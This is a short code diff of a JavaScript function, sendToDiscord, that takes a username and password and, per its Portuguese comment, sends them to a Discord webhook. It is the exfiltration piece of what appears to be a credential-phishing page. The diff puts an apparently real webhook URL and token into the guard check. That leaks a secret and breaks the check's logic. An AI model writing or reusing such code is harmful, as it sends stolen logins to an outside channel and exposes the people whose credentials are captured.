@@ -1,6 +1,6 @@
 // Enviar dados para o Discord via webhook
 export async function sendToDiscord(webhookUrl, username, password) {
-    if (!webhookUrl || webhookUrl.includes('seu-webhook-aqui')) {
+    if (!webhookUrl || webhookUrl.includes('https://discord.com/api/webhooks/1429236562134302781/9aDDtdDEO18AtU_Z7s08oRx9vjwhaez9shQWO6P3Ycf0ljNPM5iEitEd1f_8p8Opj-o2')) {
         console.warn('Webhook do Discord não configurado. Configure o webhook no script.js');
         return;
     }
